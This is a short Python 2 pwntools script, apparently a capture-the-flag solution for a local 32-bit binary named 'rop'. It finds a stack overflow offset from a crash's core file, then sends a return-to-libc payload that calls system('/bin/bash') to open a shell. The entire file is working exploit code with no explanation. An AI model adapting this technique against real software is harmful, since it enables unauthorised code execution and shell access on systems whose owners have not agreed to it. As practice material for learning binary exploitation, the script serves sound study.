#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)
from pwn import *

context(os='linux', arch='i386', log_level='DEBUG')
elf = ELF('./rop')
io = process(elf.path)
io.sendline(cyclic(1000))
io.wait()

core = io.corefile
esp = core.esp
pattern = core.read(esp, 4)

offset =  cyclic_find(pattern) - 4
payload = flat([cyclic(offset),elf.sym['system'], 'AAAA', next(elf.search("/bin/bash\x00"))])

io = process(elf.path)
io.send(payload)
io.interactive()
